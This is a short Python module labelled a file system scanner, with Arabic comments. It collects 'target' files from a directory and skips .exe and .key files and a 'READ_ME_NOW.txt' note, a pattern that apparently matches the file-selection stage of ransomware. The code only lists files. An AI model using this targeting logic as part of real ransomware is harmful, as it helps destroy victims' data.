import os

# ==========================================
# Developer: Hanan
# Module: File System Scanner
# ==========================================

def get_target_files(target_path):
    """
    وظيفة حنان: البحث عن الملفات المستهدفة في المسار المحدد
    """
    files_list = []
    
    # التأكد من وجود المجلد
    if os.path.exists(target_path):
        print(f"[Hanan-Scanner] Scanning directory: {target_path}...")
        for filename in os.listdir(target_path):
            full_path = os.path.join(target_path, filename)
            # استبعاد ملفات النظام والبرامج
            if os.path.isfile(full_path) and not filename.endswith(".exe") \
               and not filename.endswith(".key") and not filename.endswith("READ_ME_NOW.txt"):
                files_list.append(full_path)
                print(f"[Hanan-Scanner] Target found: {filename}")
    else:
        print(f"[Hanan-Scanner] Error: Path not found -> {target_path}")
        
    return files_list


